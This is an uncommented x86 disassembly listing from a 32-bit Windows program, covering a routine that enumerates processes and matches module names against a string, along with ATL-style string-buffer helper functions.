  403060:	or     DWORD PTR [ebp-0x4],0xffffffff
  403064:	mov    ebx,DWORD PTR [ebp-0x818]
  40306a:	mov    esi,DWORD PTR [ebp-0x828]
  403070:	jmp    0x403048
  403072:	xor    eax,eax
  403074:	inc    eax
  403075:	jmp    0x40307f
  403077:	mov    eax,0x40307d
  40307c:	ret    
  40307d:	xor    eax,eax
  40307f:	call   0x407ec8
  403084:	ret    0x4
  403087:	int3   
  403088:	int3   
  403089:	int3   
  40308a:	int3   
  40308b:	int3   
  40308c:	mov    edi,edi
  40308e:	push   ebp
  40308f:	mov    ebp,esp
  403091:	mov    eax,0x222c
  403096:	call   0x407fe0
  40309b:	mov    eax,ds:0x409004
  4030a0:	xor    eax,ebp
  4030a2:	mov    DWORD PTR [ebp-0x4],eax
  4030a5:	mov    eax,edx
  4030a7:	mov    DWORD PTR [ebp-0x2224],ecx
  4030ad:	push   edi
  4030ae:	mov    DWORD PTR [ebp-0x2220],eax
  4030b4:	xor    edi,edi
  4030b6:	mov    DWORD PTR [eax],edi
  4030b8:	lea    eax,[ebp-0x2210]
  4030be:	push   eax
  4030bf:	push   0x2000
  4030c4:	lea    eax,[ebp-0x220c]
  4030ca:	push   eax
  4030cb:	call   DWORD PTR ds:0x40a0f4
  4030d1:	test   eax,eax
  4030d3:	je     0x403206
  4030d9:	mov    eax,DWORD PTR [ebp-0x2210]
  4030df:	mov    ecx,0x800
  4030e4:	shr    eax,0x2
  4030e7:	mov    DWORD PTR [ebp-0x2210],eax
  4030ed:	cmp    eax,ecx
  4030ef:	jbe    0x4030f7
  4030f1:	mov    DWORD PTR [ebp-0x2210],ecx
  4030f7:	push   ebx
  4030f8:	call   DWORD PTR ds:0x40a0e4
  4030fe:	mov    ebx,eax
  403100:	mov    DWORD PTR [ebp-0x2218],edi
  403106:	lea    eax,[ebp-0x2218]
  40310c:	mov    DWORD PTR [ebp-0x2214],ebx
  403112:	push   eax
  403113:	push   ebx
  403114:	call   DWORD PTR ds:0x40a0f8
  40311a:	test   eax,eax
  40311c:	je     0x403205
  403122:	push   esi
  403123:	mov    esi,edi
  403125:	cmp    DWORD PTR [ebp-0x2210],esi
  40312b:	jbe    0x403202
  403131:	lea    eax,[ebp-0x2228]
  403137:	push   eax
  403138:	push   DWORD PTR [ebp+esi*4-0x220c]
  40313f:	call   DWORD PTR ds:0x40a0f8
  403145:	test   eax,eax
  403147:	je     0x4031e4
  40314d:	mov    eax,DWORD PTR [ebp-0x2228]
  403153:	cmp    eax,DWORD PTR [ebp-0x2218]
  403159:	jne    0x4031e4
  40315f:	cmp    DWORD PTR [ebp+0x8],edi
  403162:	je     0x40316d
  403164:	cmp    ebx,DWORD PTR [ebp+esi*4-0x220c]
  40316b:	je     0x4031e4
  40316d:	push   DWORD PTR [ebp+esi*4-0x220c]
  403174:	push   edi
  403175:	push   0x410
  40317a:	call   DWORD PTR ds:0x40a0fc
  403180:	mov    ebx,eax
  403182:	test   ebx,ebx
  403184:	je     0x4031de
  403186:	lea    eax,[ebp-0x222c]
  40318c:	push   eax
  40318d:	push   0x4
  40318f:	lea    eax,[ebp-0x221c]
  403195:	push   eax
  403196:	push   ebx
  403197:	call   DWORD PTR ds:0x40a100
  40319d:	test   eax,eax
  40319f:	je     0x4031d7
  4031a1:	push   0x104
  4031a6:	lea    eax,[ebp-0x20c]
  4031ac:	push   eax
  4031ad:	push   DWORD PTR [ebp-0x221c]
  4031b3:	push   ebx
  4031b4:	call   DWORD PTR ds:0x40a104
  4031ba:	test   eax,eax
  4031bc:	je     0x4031d7
  4031be:	push   DWORD PTR [ebp-0x2224]
  4031c4:	lea    eax,[ebp-0x20c]
  4031ca:	push   eax
  4031cb:	call   DWORD PTR ds:0x40a1ec
  4031d1:	pop    ecx
  4031d2:	pop    ecx
  4031d3:	test   eax,eax
  4031d5:	je     0x4031f3
  4031d7:	push   ebx
  4031d8:	call   DWORD PTR ds:0x40a05c
  4031de:	mov    ebx,DWORD PTR [ebp-0x2214]
  4031e4:	inc    esi
  4031e5:	cmp    esi,DWORD PTR [ebp-0x2210]
  4031eb:	jb     0x403131
  4031f1:	jmp    0x403202
  4031f3:	mov    eax,DWORD PTR [ebp-0x2220]
  4031f9:	mov    edi,DWORD PTR [ebp+esi*4-0x220c]
  403200:	mov    DWORD PTR [eax],ebx
  403202:	mov    eax,edi
  403204:	pop    esi
  403205:	pop    ebx
  403206:	mov    ecx,DWORD PTR [ebp-0x4]
  403209:	xor    ecx,ebp
  40320b:	pop    edi
  40320c:	call   0x407750
  403211:	mov    esp,ebp
  403213:	pop    ebp
  403214:	ret    0x4
  403217:	int3   
  403218:	int3   
  403219:	int3   
  40321a:	int3   
  40321b:	int3   
  40321c:	mov    ecx,DWORD PTR [ecx]
  40321e:	sub    ecx,0x10
  403221:	jmp    0x403776
  403226:	int3   
  403227:	int3   
  403228:	int3   
  403229:	int3   
  40322a:	int3   
  40322b:	mov    edi,edi
  40322d:	push   ebp
  40322e:	mov    ebp,esp
  403230:	cmp    DWORD PTR [ebp+0x8],0x0
  403234:	push   edi
  403235:	mov    edi,ecx
  403237:	jne    0x40323d
  403239:	xor    edx,edx
  40323b:	jmp    0x403256
  40323d:	mov    edx,DWORD PTR [ebp+0x8]
  403240:	push   ebx
  403241:	xor    ebx,ebx
  403243:	lea    ecx,[edx+0x2]
  403246:	mov    ax,WORD PTR [edx]
  403249:	add    edx,0x2
  40324c:	cmp    ax,bx
  40324f:	jne    0x403246
  403251:	sub    edx,ecx
  403253:	sar    edx,1
  403255:	pop    ebx
  403256:	push   edx
  403257:	push   DWORD PTR [ebp+0x8]
  40325a:	mov    ecx,edi
  40325c:	call   0x40356c
  403261:	mov    eax,edi
  403263:	pop    edi
  403264:	pop    ebp
  403265:	ret    0x4
  403268:	int3   
  403269:	int3   
  40326a:	int3   
  40326b:	int3   
  40326c:	int3   
  40326d:	mov    edi,edi
  40326f:	push   ebp
  403270:	mov    ebp,esp
  403272:	cmp    DWORD PTR [ebp+0x8],0x0
  403276:	push   esi
  403277:	push   edi
  403278:	mov    edi,ecx
  40327a:	je     0x403294
  40327c:	push   0x0
  40327e:	push   0x0
  403280:	push   0xffffffff
  403282:	push   DWORD PTR [ebp+0x8]
  403285:	push   0x0
  403287:	push   0x3
  403289:	call   DWORD PTR ds:0x40a108
  40328f:	lea    esi,[eax-0x1]
  403292:	jmp    0x403296
  403294:	xor    esi,esi
  403296:	mov    ecx,edi
  403298:	test   esi,esi
  40329a:	jle    0x4032bd
  40329c:	push   esi
  40329d:	call   0x4033fb
  4032a2:	push   esi
  4032a3:	push   eax
  4032a4:	push   0xffffffff
  4032a6:	push   DWORD PTR [ebp+0x8]
  4032a9:	push   0x0
  4032ab:	push   0x3
  4032ad:	call   DWORD PTR ds:0x40a108
  4032b3:	push   esi
  4032b4:	mov    ecx,edi
  4032b6:	call   0x4034da
  4032bb:	jmp    0x4032c2
  4032bd:	call   0x403398
  4032c2:	mov    eax,edi
  4032c4:	pop    edi
  4032c5:	pop    esi
  4032c6:	pop    ebp
  4032c7:	ret    0x4
  4032ca:	int3   
  4032cb:	int3   
  4032cc:	int3   
  4032cd:	int3   
  4032ce:	int3   
  4032cf:	mov    edi,edi
  4032d1:	push   esi
  4032d2:	push   edi
  4032d3:	mov    edi,ecx
  4032d5:	mov    eax,DWORD PTR [edi]
  4032d7:	mov    esi,DWORD PTR [eax-0xc]
  4032da:	push   esi
  4032db:	call   0x4033fb
  4032e0:	lea    edx,[esi+0x1]
  4032e3:	push   edx
  4032e4:	push   eax
  4032e5:	call   DWORD PTR ds:0x40a17c
  4032eb:	pop    ecx
  4032ec:	pop    ecx
  4032ed:	push   esi
  4032ee:	mov    ecx,edi
  4032f0:	call   0x4034da
  4032f5:	mov    eax,edi
  4032f7:	pop    edi
  4032f8:	pop    esi
  4032f9:	ret    
  4032fa:	int3   
  4032fb:	int3   
  4032fc:	int3   
  4032fd:	int3   
  4032fe:	int3   
  4032ff:	mov    edi,edi
  403301:	push   esi
  403302:	mov    esi,ecx
  403304:	mov    ecx,DWORD PTR [esi]
  403306:	test   ecx,ecx
  403308:	je     0x403310
  40330a:	push   ecx
  40330b:	call   0x403429
  403310:	and    DWORD PTR [esi],0x0
  403313:	pop    esi
  403314:	ret    
  403315:	int3   
  403316:	int3   
  403317:	int3   
  403318:	int3   
  403319:	int3   
  40331a:	mov    edi,edi
  40331c:	push   ebp
  40331d:	mov    ebp,esp
  40331f:	mov    edx,DWORD PTR [ebp+0x8]
  403322:	test   edx,edx
  403324:	je     0x403331
  403326:	mov    ecx,DWORD PTR [ecx]
  403328:	call   0x4037be
  40332d:	pop    ebp
  40332e:	ret    0x4
  403331:	mov    ecx,0x80004005
  403336:	call   0x403805
  40333b:	int3   
  40333c:	int3   
  40333d:	int3   
  40333e:	int3   
  40333f:	int3   
  403340:	int3   
  403341:	mov    edi,edi
  403343:	push   ebp
  403344:	mov    ebp,esp
  403346:	push   ecx
  403347:	mov    eax,ds:0x409004
  40334c:	xor    eax,ebp
  40334e:	mov    DWORD PTR [ebp-0x4],eax
  403351:	push   ebx
  403352:	push   esi
  403353:	push   edi
  403354:	mov    edi,DWORD PTR [ebp+0x8]
  403357:	mov    ebx,ecx
  403359:	test   edi,edi
  40335b:	je     0x403388
  40335d:	mov    eax,DWORD PTR [edi]
  40335f:	mov    esi,DWORD PTR [eax+0xc]
  403362:	mov    ecx,esi
  403364:	call   DWORD PTR ds:0x40a20c
  40336a:	mov    ecx,edi
  40336c:	call   esi
  40336e:	mov    ecx,DWORD PTR [ebp-0x4]
  403371:	add    eax,0x10
  403374:	pop    edi
  403375:	mov    DWORD PTR [ebx],eax
  403377:	xor    ecx,ebp
  403379:	pop    esi
  40337a:	mov    eax,ebx
  40337c:	pop    ebx
  40337d:	call   0x407750
  403382:	mov    esp,ebp
  403384:	pop    ebp
  403385:	ret    0x4
  403388:	mov    ecx,0x80004005
  40338d:	call   0x403805
  403392:	int3   
  403393:	int3   
  403394:	int3   
  403395:	int3   
  403396:	int3   
  403397:	int3   
  403398:	mov    edi,edi
  40339a:	push   ebp
  40339b:	mov    ebp,esp
  40339d:	push   ecx
  40339e:	mov    eax,ds:0x409004
  4033a3:	xor    eax,ebp
  4033a5:	mov    DWORD PTR [ebp-0x4],eax
  4033a8:	push   ebx
  4033a9:	push   edi
  4033aa:	mov    edi,ecx
  4033ac:	xor    eax,eax
  4033ae:	mov    ecx,DWORD PTR [edi]
  4033b0:	sub    ecx,0x10
  4033b3:	mov    ebx,DWORD PTR [ecx]
  4033b5:	cmp    DWORD PTR [ecx+0x4],eax
  4033b8:	je     0x4033e6
  4033ba:	cmp    DWORD PTR [ecx+0xc],eax
  4033bd:	jge    0x4033c9
  4033bf:	push   eax
  4033c0:	mov    ecx,edi
  4033c2:	call   0x4034da
  4033c7:	jmp    0x4033e6
  4033c9:	push   esi
  4033ca:	call   0x403776
  4033cf:	mov    eax,DWORD PTR [ebx]
  4033d1:	mov    esi,DWORD PTR [eax+0xc]
  4033d4:	mov    ecx,esi
  4033d6:	call   DWORD PTR ds:0x40a20c
  4033dc:	mov    ecx,ebx
  4033de:	call   esi
  4033e0:	add    eax,0x10
  4033e3:	mov    DWORD PTR [edi],eax
  4033e5:	pop    esi
  4033e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4033e9:	pop    edi
  4033ea:	xor    ecx,ebp
  4033ec:	pop    ebx
  4033ed:	call   0x407750
  4033f2:	mov    esp,ebp
  4033f4:	pop    ebp
  4033f5:	ret    
  4033f6:	int3   
  4033f7:	int3   
  4033f8:	int3   
  4033f9:	int3   
  4033fa:	int3   
  4033fb:	mov    edi,edi
  4033fd:	push   ebp
  4033fe:	mov    ebp,esp
  403400:	push   esi
  403401:	mov    esi,ecx
  403403:	xor    edx,edx
  403405:	inc    edx
  403406:	mov    eax,DWORD PTR [esi]
  403408:	sub    edx,DWORD PTR [eax-0x4]
  40340b:	mov    eax,DWORD PTR [eax-0x8]
  40340e:	sub    eax,DWORD PTR [ebp+0x8]
  403411:	or     edx,eax
  403413:	jge    0x40341d
  403415:	push   DWORD PTR [ebp+0x8]
  403418:	call   0x4035f4
  40341d:	mov    eax,DWORD PTR [esi]
  40341f:	pop    esi
  403420:	pop    ebp
  403421:	ret    0x4
  403424:	int3   
  403425:	int3   
  403426:	int3   
  403427:	int3   
  403428:	int3   
  403429:	mov    edi,edi
  40342b:	push   esi
  40342c:	mov    esi,ecx
  40342e:	push   edi
  40342f:	push   0x10
  403431:	pop    edi
  403432:	mov    ecx,DWORD PTR [esi+0x28]
  403435:	sub    ecx,edi
  403437:	call   0x403776
  40343c:	mov    ecx,DWORD PTR [esi+0x1c]
  40343f:	sub    ecx,edi
  403441:	call   0x403776
  403446:	mov    ecx,DWORD PTR [esi+0x18]
  403449:	sub    ecx,edi
  40344b:	call   0x403776
  403450:	mov    ecx,DWORD PTR [esi+0x14]
  403453:	sub    ecx,edi
  403455:	call   0x403776
  40345a:	mov    ecx,DWORD PTR [esi+0x10]
  40345d:	sub    ecx,edi
  40345f:	call   0x403776
  403464:	mov    ecx,DWORD PTR [esi+0xc]
  403467:	sub    ecx,edi
  403469:	call   0x403776
  40346e:	mov    ecx,DWORD PTR [esi+0x8]
  403471:	sub    ecx,edi
  403473:	call   0x403776
  403478:	mov    ecx,DWORD PTR [esi+0x4]
  40347b:	sub    ecx,edi
  40347d:	call   0x403776
  403482:	mov    ecx,DWORD PTR [esi]
  403484:	sub    ecx,edi
  403486:	call   0x403776
  40348b:	push   esi
  40348c:	call   0x407458
  403491:	pop    ecx
  403492:	pop    edi
  403493:	mov    eax,esi
  403495:	pop    esi
  403496:	ret    0x4
  403499:	int3   
  40349a:	int3   
  40349b:	int3   
  40349c:	int3   
  40349d:	int3   
  40349e:	mov    edi,edi
  4034a0:	push   ebp
  4034a1:	mov    ebp,esp
  4034a3:	cmp    DWORD PTR [ebp+0x8],0x0
  4034a7:	jne    0x4034ad
  4034a9:	xor    edx,edx
  4034ab:	jmp    0x4034c8
  4034ad:	mov    edx,DWORD PTR [ebp+0x8]
  4034b0:	push   ebx
  4034b1:	push   edi
  4034b2:	xor    ebx,ebx
  4034b4:	lea    edi,[edx+0x2]
  4034b7:	mov    ax,WORD PTR [edx]
  4034ba:	add    edx,0x2
  4034bd:	cmp    ax,bx
  4034c0:	jne    0x4034b7
  4034c2:	sub    edx,edi
  4034c4:	pop    edi
  4034c5:	sar    edx,1
  4034c7:	pop    ebx
  4034c8:	push   edx
  4034c9:	push   DWORD PTR [ebp+0x8]
  4034cc:	call   0x40350c
  4034d1:	pop    ebp
  4034d2:	ret    0x4
  4034d5:	int3   
  4034d6:	int3   
  4034d7:	int3   
  4034d8:	int3   
  4034d9:	int3   
  4034da:	mov    edi,edi
  4034dc:	push   ebp
  4034dd:	mov    ebp,esp
  4034df:	mov    edx,DWORD PTR [ebp+0x8]
  4034e2:	test   edx,edx
  4034e4:	js     0x4034fc
  4034e6:	mov    eax,DWORD PTR [ecx]
  4034e8:	cmp    edx,DWORD PTR [eax-0x8]
  4034eb:	jg     0x4034fc
  4034ed:	mov    DWORD PTR [eax-0xc],edx
  4034f0:	mov    eax,DWORD PTR [ecx]
  4034f2:	xor    ecx,ecx
  4034f4:	mov    WORD PTR [eax+edx*2],cx
  4034f8:	pop    ebp
  4034f9:	ret    0x4
  4034fc:	mov    ecx,0x80070057
  403501:	call   0x403805
  403506:	int3   
  403507:	int3   
  403508:	int3   
  403509:	int3   
  40350a:	int3   
  40350b:	int3   
  40350c:	mov    edi,edi
  40350e:	push   ebp
  40350f:	mov    ebp,esp
  403511:	push   ecx
  403512:	push   ecx
  403513:	push   ebx
  403514:	push   esi
  403515:	mov    ebx,ecx
  403517:	push   edi
  403518:	mov    edi,DWORD PTR [ebp+0x8]
  40351b:	mov    esi,edi
  40351d:	mov    eax,DWORD PTR [ebx]
  40351f:	sub    esi,eax
  403521:	sar    esi,1
  403523:	mov    eax,DWORD PTR [eax-0xc]
  403526:	mov    DWORD PTR [ebp-0x4],eax
  403529:	add    eax,DWORD PTR [ebp+0xc]
  40352c:	push   eax
  40352d:	mov    DWORD PTR [ebp-0x8],eax
  403530:	call   0x4033fb
  403535:	mov    edx,DWORD PTR [ebp-0x4]
  403538:	cmp    esi,edx
  40353a:	ja     0x40353f
  40353c:	lea    edi,[eax+esi*2]
  40353f:	mov    ecx,DWORD PTR [ebp+0xc]
  403542:	lea    eax,[eax+edx*2]
  403545:	add    ecx,ecx
  403547:	push   ecx
  403548:	push   edi
  403549:	push   ecx
  40354a:	push   eax
  40354b:	call   DWORD PTR ds:0x40a180
  403551:	add    esp,0x10
  403554:	mov    ecx,ebx
  403556:	push   DWORD PTR [ebp-0x8]
  403559:	call   0x4034da
  40355e:	pop    edi
  40355f:	pop    esi
  403560:	pop    ebx
  403561:	mov    esp,ebp
  403563:	pop    ebp
  403564:	ret    0x8
  403567:	int3   
  403568:	int3   
  403569:	int3   
  40356a:	int3   
  40356b:	int3   
  40356c:	mov    edi,edi
  40356e:	push   ebp
  40356f:	mov    ebp,esp
  403571:	push   ecx
  403572:	push   ecx
  403573:	push   ebx
  403574:	push   edi
  403575:	mov    edi,DWORD PTR [ebp+0xc]
  403578:	mov    ebx,ecx
  40357a:	test   edi,edi
  40357c:	jne    0x403585
  40357e:	call   0x403398
  403583:	jmp    0x4035dc
  403585:	cmp    DWORD PTR [ebp+0x8],0x0
  403589:	je     0x4035e4
  40358b:	mov    eax,DWORD PTR [ebx]
  40358d:	mov    ecx,DWORD PTR [ebp+0x8]
  403590:	sub    ecx,eax
  403592:	sar    ecx,1
  403594:	push   esi
  403595:	mov    esi,DWORD PTR [eax-0xc]
  403598:	mov    DWORD PTR [ebp-0x4],ecx
  40359b:	mov    ecx,ebx
  40359d:	push   edi
  40359e:	call   0x4033fb
  4035a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4035a6:	cmp    ecx,esi
  4035a8:	mov    DWORD PTR [ebp-0x8],eax
  4035ab:	pop    esi
  4035ac:	ja     0x4035c0
  4035ae:	lea    edx,[edi+edi*1]
  4035b1:	push   edx
  4035b2:	lea    ecx,[eax+ecx*2]
  4035b5:	push   ecx
  4035b6:	push   edx
  4035b7:	push   eax
  4035b8:	call   DWORD PTR ds:0x40a184
  4035be:	jmp    0x4035d1
  4035c0:	lea    eax,[edi+edi*1]
  4035c3:	push   eax
  4035c4:	push   DWORD PTR [ebp+0x8]
  4035c7:	push   eax
  4035c8:	push   DWORD PTR [ebp-0x8]
  4035cb:	call   DWORD PTR ds:0x40a180
  4035d1:	add    esp,0x10
  4035d4:	mov    ecx,ebx
  4035d6:	push   edi
  4035d7:	call   0x4034da
  4035dc:	pop    edi
  4035dd:	pop    ebx
  4035de:	mov    esp,ebp
  4035e0:	pop    ebp
  4035e1:	ret    0x8
  4035e4:	mov    ecx,0x80070057
  4035e9:	call   0x403805
  4035ee:	int3   
  4035ef:	int3   
  4035f0:	int3   
  4035f1:	int3   
  4035f2:	int3   
  4035f3:	int3   
  4035f4:	mov    edi,edi
  4035f6:	push   ebp
  4035f7:	mov    ebp,esp
  4035f9:	push   esi
  4035fa:	mov    esi,DWORD PTR [ebp+0x8]
  4035fd:	push   edi
  4035fe:	mov    edi,ecx
  403600:	mov    ecx,DWORD PTR [edi]
  403602:	cmp    DWORD PTR [ecx-0xc],esi
  403605:	jle    0x40360a
  403607:	mov    esi,DWORD PTR [ecx-0xc]
  40360a:	cmp    DWORD PTR [ecx-0x4],0x1
  40360e:	jle    0x40361a
  403610:	push   esi
  403611:	mov    ecx,edi
  403613:	call   0x403653
  403618:	jmp    0x403648
  40361a:	mov    ecx,DWORD PTR [ecx-0x8]
  40361d:	cmp    ecx,esi
  40361f:	jge    0x403648
  403621:	cmp    ecx,0x40000000
  403627:	jle    0x403631
  403629:	add    ecx,0x100000
  40362f:	jmp    0x40363a
  403631:	mov    eax,ecx
  403633:	cdq    
  403634:	sub    eax,edx
  403636:	sar    eax,1
  403638:	add    ecx,eax
  40363a:	cmp    ecx,esi
  40363c:	jge    0x403640
  40363e:	mov    ecx,esi
  403640:	push   ecx
  403641:	mov    ecx,edi
  403643:	call   0x403703
  403648:	pop    edi
  403649:	pop    esi
  40364a:	pop    ebp
  40364b:	ret    0x4
  40364e:	int3   
  40364f:	int3   
  403650:	int3   
  403651:	int3   
  403652:	int3   
  403653:	mov    edi,edi
  403655:	push   ebp
  403656:	mov    ebp,esp
  403658:	sub    esp,0x14
  40365b:	mov    eax,ds:0x409004
  403660:	xor    eax,ebp
  403662:	mov    DWORD PTR [ebp-0x4],eax
  403665:	mov    eax,ecx
  403667:	push   ebx
  403668:	push   esi
  403669:	push   edi
  40366a:	mov    ecx,DWORD PTR [eax]
  40366c:	sub    ecx,0x10
  40366f:	mov    DWORD PTR [ebp-0x14],eax
  403672:	mov    DWORD PTR [ebp-0x8],ecx
  403675:	mov    edi,DWORD PTR [ecx]
  403677:	mov    eax,DWORD PTR [ecx+0x4]
  40367a:	mov    DWORD PTR [ebp-0x10],eax
  40367d:	mov    eax,DWORD PTR [edi]
  40367f:	mov    esi,DWORD PTR [eax+0x10]
  403682:	mov    ecx,esi
  403684:	call   DWORD PTR ds:0x40a20c
  40368a:	mov    ecx,edi
  40368c:	call   esi
  40368e:	mov    ebx,DWORD PTR [ebp+0x8]
  403691:	mov    edi,eax
  403693:	push   0x2
  403695:	push   ebx
  403696:	mov    ecx,DWORD PTR [edi]
  403698:	mov    esi,DWORD PTR [ecx]
  40369a:	mov    ecx,esi
  40369c:	call   DWORD PTR ds:0x40a20c
  4036a2:	mov    ecx,edi
  4036a4:	call   esi
  4036a6:	mov    DWORD PTR [ebp-0xc],eax
  4036a9:	test   eax,eax
  4036ab:	je     0x4036f8
  4036ad:	mov    edi,DWORD PTR [ebp-0x10]
  4036b0:	cmp    edi,ebx
  4036b2:	jge    0x4036b6
  4036b4:	mov    ebx,edi
  4036b6:	lea    edx,[ebx*2+0x2]
  4036bd:	mov    ebx,DWORD PTR [ebp-0x8]
  4036c0:	lea    esi,[eax+0x10]
  4036c3:	push   edx
  4036c4:	lea    eax,[ebx+0x10]
  4036c7:	push   eax
  4036c8:	push   edx
  4036c9:	push   esi
  4036ca:	call   DWORD PTR ds:0x40a180
  4036d0:	mov    eax,DWORD PTR [ebp-0xc]
  4036d3:	add    esp,0x10
  4036d6:	mov    ecx,ebx
  4036d8:	mov    DWORD PTR [eax+0x4],edi
  4036db:	call   0x403776
  4036e0:	mov    eax,DWORD PTR [ebp-0x14]
  4036e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4036e6:	pop    edi
  4036e7:	xor    ecx,ebp
  4036e9:	mov    DWORD PTR [eax],esi
  4036eb:	pop    esi
  4036ec:	pop    ebx
  4036ed:	call   0x407750
  4036f2:	mov    esp,ebp
  4036f4:	pop    ebp
  4036f5:	ret    0x4
  4036f8:	call   0x403767
  4036fd:	int3   
  4036fe:	int3   
  4036ff:	int3   
  403700:	int3   
  403701:	int3   
  403702:	int3   
  403703:	mov    edi,edi
  403705:	push   ebp
  403706:	mov    ebp,esp
  403708:	push   ecx
  403709:	mov    eax,ds:0x409004
  40370e:	xor    eax,ebp
  403710:	mov    DWORD PTR [ebp-0x4],eax
  403713:	push   ebx
  403714:	push   esi
  403715:	mov    esi,DWORD PTR [ebp+0x8]
  403718:	push   edi
  403719:	mov    edi,ecx
  40371b:	mov    edx,DWORD PTR [edi]
  40371d:	sub    edx,0x10
  403720:	mov    ebx,DWORD PTR [edx]
  403722:	cmp    DWORD PTR [edx+0x8],esi
  403725:	jge    0x40375c
  403727:	test   esi,esi
  403729:	jle    0x40375c
  40372b:	mov    eax,DWORD PTR [ebx]
  40372d:	push   0x2
  40372f:	push   esi
  403730:	push   edx
  403731:	mov    esi,DWORD PTR [eax+0x8]
  403734:	mov    ecx,esi
  403736:	call   DWORD PTR ds:0x40a20c
  40373c:	mov    ecx,ebx
  40373e:	call   esi
  403740:	test   eax,eax
  403742:	je     0x40375c
  403744:	mov    ecx,DWORD PTR [ebp-0x4]
  403747:	add    eax,0x10
  40374a:	mov    DWORD PTR [edi],eax
  40374c:	xor    ecx,ebp
  40374e:	pop    edi
  40374f:	pop    esi
  403750:	pop    ebx
  403751:	call   0x407750
  403756:	mov    esp,ebp
  403758:	pop    ebp
  403759:	ret    0x4
  40375c:	call   0x403767
  403761:	int3   
  403762:	int3   
  403763:	int3   
  403764:	int3   
  403765:	int3   
  403766:	int3   
  403767:	mov    ecx,0x8007000e
  40376c:	jmp    0x403805
  403771:	int3   
  403772:	int3   
  403773:	int3   
  403774:	int3   
  403775:	int3   
  403776:	mov    edi,edi
  403778:	push   ebp
  403779:	mov    ebp,esp
  40377b:	push   ecx
  40377c:	mov    eax,ds:0x409004
  403781:	xor    eax,ebp
  403783:	mov    DWORD PTR [ebp-0x4],eax
  403786:	or     eax,0xffffffff
  403789:	lock xadd DWORD PTR [ecx+0xc],eax
  40378e:	dec    eax
  40378f:	test   eax,eax
  403791:	jg     0x4037ab
  403793:	push   esi
  403794:	push   edi
  403795:	mov    edi,DWORD PTR [ecx]
  403797:	push   ecx
  403798:	mov    eax,DWORD PTR [edi]
  40379a:	mov    esi,DWORD PTR [eax+0x4]
  40379d:	mov    ecx,esi
  40379f:	call   DWORD PTR ds:0x40a20c
  4037a5:	mov    ecx,edi
  4037a7:	call   esi
  4037a9:	pop    edi
  4037aa:	pop    esi
  4037ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4037ae:	xor    ecx,ebp
  4037b0:	call   0x407750
  4037b5:	mov    esp,ebp
  4037b7:	pop    ebp
  4037b8:	ret    
  4037b9:	int3   
  4037ba:	int3   
  4037bb:	int3   
  4037bc:	int3   
  4037bd:	int3   
  4037be:	mov    edi,edi
  4037c0:	mov    ax,WORD PTR [ecx]
  4037c3:	cmp    ax,WORD PTR [edx]
  4037c6:	jne    0x4037e5
  4037c8:	test   ax,ax
  4037cb:	je     0x4037e2
  4037cd:	mov    ax,WORD PTR [ecx+0x2]
  4037d1:	cmp    ax,WORD PTR [edx+0x2]
  4037d5:	jne    0x4037e5
  4037d7:	add    ecx,0x4
  4037da:	add    edx,0x4
  4037dd:	test   ax,ax
  4037e0:	jne    0x4037c0
  4037e2:	xor    eax,eax
  4037e4:	ret    
  4037e5:	sbb    eax,eax
  4037e7:	or     eax,0x1
  4037ea:	ret    
  4037eb:	int3   
  4037ec:	int3   
  4037ed:	int3   
  4037ee:	int3   
  4037ef:	int3   
  4037f0:	mov    edi,edi
  4037f2:	push   ebp
  4037f3:	mov    ebp,esp
  4037f5:	mov    eax,DWORD PTR [ebp+0x8]
  4037f8:	mov    DWORD PTR [ecx],eax
  4037fa:	mov    eax,ecx
  4037fc:	pop    ebp
  4037fd:	ret    0x4
  403800:	int3   
  403801:	int3   
  403802:	int3   
  403803:	int3   
  403804:	int3   
  403805:	mov    edi,edi
  403807:	push   ebp
  403808:	mov    ebp,esp
  40380a:	push   ecx
  40380b:	push   ecx
  40380c:	push   ecx
  40380d:	lea    ecx,[ebp-0x8]
  403810:	call   0x4037f0
  403815:	push   0x408db8
  40381a:	mov    eax,DWORD PTR [eax]
  40381c:	mov    DWORD PTR [ebp-0x4],eax
  40381f:	lea    eax,[ebp-0x4]
  403822:	push   eax
  403823:	call   0x407e90
  403828:	int3   
  403829:	int3   
  40382a:	int3   
  40382b:	int3   
  40382c:	int3   
  40382d:	int3   
  40382e:	mov    edi,edi
  403830:	push   ebp
  403831:	mov    ebp,esp
  403833:	push   0x0
  403835:	push   ecx
  403836:	push   0x4018b4
  40383b:	push   0x2b
  40383d:	push   DWORD PTR [ebp+0xc]
  403840:	push   DWORD PTR [ebp+0x8]
  403843:	call   DWORD PTR ds:0x40a03c
  403849:	add    esp,0x18
  40384c:	pop    ebp
  40384d:	ret    0x8
  403850:	int3   
  403851:	int3   
  403852:	int3   
  403853:	int3   
  403854:	int3   
  403855:	mov    edi,edi
  403857:	push   ebp
  403858:	mov    ebp,esp
  40385a:	push   0x0
  40385c:	push   0x4
  40385e:	lea    eax,[ebp+0x10]
  403861:	push   eax
  403862:	push   ecx
  403863:	push   0x4018b4
  403868:	push   0x2b
  40386a:	push   DWORD PTR [ebp+0xc]
  40386d:	push   DWORD PTR [ebp+0x8]
  403870:	call   DWORD PTR ds:0x40a03c
  403876:	add    esp,0x20
  403879:	pop    ebp
  40387a:	ret    0xc
  40387d:	int3   
  40387e:	int3   
  40387f:	int3   
  403880:	int3   
  403881:	int3   
  403882:	mov    edi,edi
  403884:	push   ebp
  403885:	mov    ebp,esp
  403887:	push   ecx
  403888:	push   ebx
  403889:	push   esi
  40388a:	mov    esi,DWORD PTR [ebp+0x10]
  40388d:	xor    eax,eax
  40388f:	mov    DWORD PTR [ebp-0x4],eax
  403892:	mov    ebx,ecx
  403894:	push   edi
  403895:	mov    edi,edx
  403897:	test   esi,esi
  403899:	je     0x4038c4
  40389b:	cmp    WORD PTR [esi],ax
  40389e:	jne    0x4038a4
  4038a0:	push   0xe
  4038a2:	jmp    0x4038c6
  4038a4:	mov    ecx,esi
  4038a6:	lea    edx,[ecx+0x2]
  4038a9:	mov    ax,WORD PTR [ecx]
  4038ac:	add    ecx,0x2
  4038af:	cmp    ax,WORD PTR [ebp-0x4]
  4038b3:	jne    0x4038a9
  4038b5:	sub    ecx,edx
  4038b7:	sar    ecx,1
  4038b9:	xor    eax,eax
  4038bb:	lea    ecx,[ecx*2+0x2]
  4038c2:	jmp    0x4038c7
  4038c4:	push   0xa
  4038c6:	pop    ecx
  4038c7:	test   esi,esi
  4038c9:	je     0x4038d7
  4038cb:	cmp    WORD PTR [esi],ax
  4038ce:	jne    0x4038dc
